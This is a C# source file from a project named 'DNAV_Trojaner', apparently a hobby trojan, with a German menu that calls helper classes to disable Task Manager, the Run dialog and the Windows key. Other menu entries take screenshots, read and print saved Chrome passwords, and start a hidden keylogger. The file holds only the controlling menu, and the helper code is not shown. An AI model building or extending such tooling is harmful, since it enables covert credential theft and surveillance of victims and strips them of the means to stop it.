using System;
using System.IO;

namespace DNAV_Trojaner
{
    class Program
    {
        static void Main(string[] args)
        {
            string input = "";
            do
            {
                Console.Clear();
                Console.WriteLine("\n\t***   **  * DNAV Debugging Menü *  **   ***");
                Console.WriteLine("\n\t(1) Taskmanager deaktivieren");
                Console.WriteLine("\t(2) Taskmanager aktivieren");
                Console.WriteLine("\n\t(3) Ausführen Dialog deaktivieren");
                Console.WriteLine("\t(4) Ausführen Dialog aktivieren (Neustart erforderlich)");
                Console.WriteLine("\n\t(5) Screenshot");
                Console.WriteLine("\n\t(6) Chrome Passwörter auslesen");
                Console.WriteLine("\n\t(7) Keylogger aktivieren und Fenster verstecken");
                Console.WriteLine("\t(8) Keylogger Output formatieren");
                Console.WriteLine("\n\t(9) Windows Taste deaktivieren (Neustart erforderlich)");
                Console.WriteLine("\t(10) Windows Taste aktivieren (Neustart erforderlich)");
                Console.WriteLine("\n\t(0) Exit");
                Console.Write("\n\t> ");
                input = Console.ReadLine();

                switch (input)
                {
                    case "1":
                        Taskmanager.Disable();
                        break;
                    case "2":
                        Taskmanager.Enable();
                        break;
                    case "3":
                        Run.Disbable();
                        break;
                    case "4":
                        Run.Enable();
                        break;
                    case "5":
                        ScreenCapture sc = new ScreenCapture();
                        sc.CaptureScreenToFile("D:\\test.png", System.Drawing.Imaging.ImageFormat.Png);
                        break;
                    case "6":
                        Console.Clear();
                        ChromePasswordReader pr = new ChromePasswordReader();
                        foreach(Credential c in pr.GetPasswords())
                        {
                            Console.WriteLine($"\t{c.Url}\n\tU: {c.Username}\n\tP: {c.Password}");       
                        }
                        Console.ReadKey();
                        break;
                    case "7":
                        Keylogger.Hide();
                        Keylogger.EnableWithLog("log.txt");    
                        break;
                    case "8":
                        StreamReader sr = new StreamReader("log.txt");
                        string raw = sr.ReadToEnd();
                        sr.Close();
                        string compiledOutput = Keylogger.CompileRawOutput(raw);
                        StreamWriter sw = new StreamWriter("newLog.txt");
                        sw.WriteLine(compiledOutput);
                        sw.Close();
                        break;
                    case "9":                     
                        WindowsKey.Disable();
                        break;
                    case "10":
                        WindowsKey.Enable();
                        break;
                }
            } while (input != "0");
            
        }
    }
}
